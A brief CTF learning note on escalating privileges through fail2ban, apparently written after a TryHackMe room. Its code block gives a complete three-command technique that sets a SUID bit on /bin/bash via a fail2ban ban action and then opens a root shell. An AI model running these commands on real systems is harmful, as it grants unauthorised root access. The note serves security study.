In this note I will go over what is fail2ban, how it works, it's moving parts and how to use them to escalate privileges.
The reason being is, the tool is popular and I encountered it in "Billing CTF" on THM ctf rooms.

This note will be a watered down howto of what I learned from this lovely article.
https://juggernaut-sec.com/fail2ban-lpe/

```shell
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'

sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4

/bin/bash -p
```